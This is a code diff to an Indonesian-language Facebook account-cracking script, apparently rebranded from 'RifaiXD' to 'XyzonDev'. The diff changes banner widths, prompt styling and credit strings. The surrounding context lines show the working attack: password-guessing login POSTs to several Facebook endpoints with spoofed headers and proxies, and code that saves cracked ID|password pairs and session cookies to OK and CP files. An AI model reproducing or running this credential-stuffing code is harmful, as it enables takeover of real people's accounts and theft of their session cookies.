@@ -395,7 +395,7 @@ def menu(my_name,my_id):
 	os.system('clear')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
-	cetak(panel(f'[bold yellow]Xyzon Dev Raja Dari Kegelapan Timur !',width=32,style=f"bold cyan"))
+	cetak(panel(f'[bold yellow]Xyzon Dev Raja Dari Kegelapan Timur !',width=37,style=f"bold cyan"))
 	cetak(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[\]\n[bold white][+[/][bold white]][/] [bold white]Status   : [bold green]Private[/][/]',width=42,style=f"bold cyan"))
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Username [[bold green] ON [bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack Komen [[bold green] ON [bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Chek Hasil Crack [[bold green] ON [bold white]][/]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Chekpoint Detector [[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Lacak IP Target [[bold green] ON [bold white]][/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Hapus Cookies [[bold green] ON [bold white]][/]',width=47,title=f"[bold green]List Menu",style=f"bold cyan"))
 	_____xyzon___xd____ = input(f' ╰─  Pilih Menu Crack : ')
@@ -648,18 +648,18 @@ def result():
 		exit()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	print('>> Hasil OK Anda ')
-	print('>> Hasil CP Anda ')
-	print('>> Kembali	')
-	kz = input('\n>> Pilih : ')
+	print(' ╰─ Hasil OK Anda [bold green]01{x} ')
+	print(' ╰─ Hasil CP Anda [bold green]02{x} ')
+	print(' ╰─ Kembali	')
+	kz = input('\n ╰─ Pilih : ')
 	if kz in ['1','01']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
-			print('>> File Tidak Di Temukan ')
+			print(' ╰─ File Tidak Di Temukan ')
 			time.sleep(3)
 			back()
 		if len(vin)==0:
-			print('>> Anda Tidak Memiliki Hasil CP ')
+			print(' ╰─ Anda Tidak Memiliki Hasil CP ')
 			time.sleep(2)
 			back()
 		else:
@@ -677,14 +677,14 @@ def result():
 				else:
 					lol.update({str(cih):str(isi)})
 					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-			geeh = input('\n>> Pilih : ')
+			geeh = input('\ ╰─ Pilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('>> Pilih Yang Bener Kontol ')
+				print(' ╰─Pilih Yang Bener Kontol ')
 				exit()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
-				print('>> File Tidak Di Temukan ')
+				print(' ╰─ File Tidak Di Temukan ')
 				time.sleep(2)
 				back()
 			nocp=0
@@ -698,11 +698,11 @@ def result():
 	elif kz in ['2','02']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			print('>> File Tidak Di Temukan ')
+			print(' ╰─ File Tidak Di Temukan ')
 			time.sleep(2)
 			back()
 		if len(vin)==0:
-			print('>> Anda Tidak Mempunyai File OK ')
+			print(' ╰─ Anda Tidak Mempunyai File OK ')
 			time.sleep(2)
 			back()
 		else:
@@ -720,14 +720,14 @@ def result():
 				else:
 					lol.update({str(cih):str(isi)})
 					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-			geeh = input('\n>> Pilih : ')
+			geeh = input('\n ╰─ Pilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('>> Pilih Yang Bener Kontol ')
+				print(' ╰─ Pilih Yang Bener Kontol ')
 				exit()
 			try:lin = open('OK/'+geh,'r').read().splitlines()
 			except:
-				print('>> File Tidak Di Temukan ')
+				print(' ╰─ File Tidak Di Temukan ')
 				time.sleep(2)
 				back()
 			nocp=0
@@ -742,7 +742,7 @@ def result():
 	elif kz in ['0','00']:
 		back()
 	else:
-		print('>> Pilih Yang Bener Kontol ')
+		print(' ╰─ Pilih Yang Bener Kontol ')
 		exit()
 #-------------------[ CRACK-PUBLIK-MASSAL]----------------#
 def brayen_dump():
@@ -941,7 +941,7 @@ def crack(idf,pwv):
 			ses.headers.update({"Host":'d.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold yellow]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold yellow]RifaiXD CP Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold yellow]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold yellow]XyzonDev CP Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -950,7 +950,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{ua}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]RifaiXD OK Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{ua}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]XyzonDev OK Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
@@ -1002,7 +1002,7 @@ def crackasync(idf,pwv):
 			}
 			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold yellow]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold yellow]RifaiXD CP Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold yellow]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold yellow]XyzonDev CP Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1062,7 +1062,7 @@ def crackreguler(idf,pwv):
 			}
 			po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold yellow]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold yellow]RifaiXD CP Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold yellow]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold yellow]XyzonDev CP Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1071,7 +1071,7 @@ def crackreguler(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{ua}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold green]RifaiXD OK Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{ua}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold green]XyzonDev OK Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
@@ -1103,7 +1103,7 @@ def crackmbasic(idf,pwv):
 			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold yellow]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold yellow]RifaiXD CP Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold yellow]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold yellow]XyzonDev CP Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1112,7 +1112,7 @@ def crackmbasic(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{ua}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold green]RifaiXD OK Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{ua}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold green]XyzonDev OK Tersimpan Di {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
